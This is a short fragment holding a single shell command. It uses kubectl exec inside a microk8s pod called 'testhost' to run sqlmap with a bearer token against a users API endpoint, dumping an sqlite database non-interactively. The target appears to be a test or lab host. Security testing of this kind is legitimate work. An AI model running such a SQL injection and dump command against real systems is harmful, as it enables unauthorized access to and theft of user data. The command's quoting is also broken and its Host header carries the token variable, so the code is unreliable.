...
microk8s.kubectl exec -it  testhost  -n testhost -- bash -c "host=$HOST && sqlmap -u $HOST"/users/v1/*name1*" --method=GET --headers="Accept: application/json\nAuthorization: Bearer $TOKEN Host: ${TOKEN} " --dbms=sqlite --dump --batch "
